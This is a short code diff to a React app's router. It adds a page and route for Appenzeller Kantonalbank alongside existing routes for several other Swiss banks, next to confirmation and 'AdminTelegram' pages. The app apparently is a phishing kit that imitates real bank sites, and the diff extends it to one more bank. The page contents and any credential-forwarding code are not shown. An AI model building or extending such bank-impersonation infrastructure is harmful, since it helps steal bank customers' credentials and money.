@@ -37,6 +37,7 @@ import ChPostfinance from "./pages/ChPostfinance.tsx";
 import ChBaloise from "./pages/ChBaloise.tsx";
 import ChValiant from "./pages/ChValiant.tsx";
 import ChAargauischeKantonalbank from "./pages/ChAargauischeKantonalbank.tsx";
+import ChAppenzellerKantonalbank from "./pages/ChAppenzellerKantonalbank.tsx";
 
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
@@ -143,6 +144,7 @@ const App = () => (
             <Route path="/ch/baloise" element={<P><ChBaloise /></P>} />
             <Route path="/ch/valiant" element={<P><ChValiant /></P>} />
             <Route path="/ch/aargauische-kantonalbank" element={<P><ChAargauischeKantonalbank /></P>} />
+            <Route path="/ch/appenzeller-kantonalbank" element={<P><ChAppenzellerKantonalbank /></P>} />
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
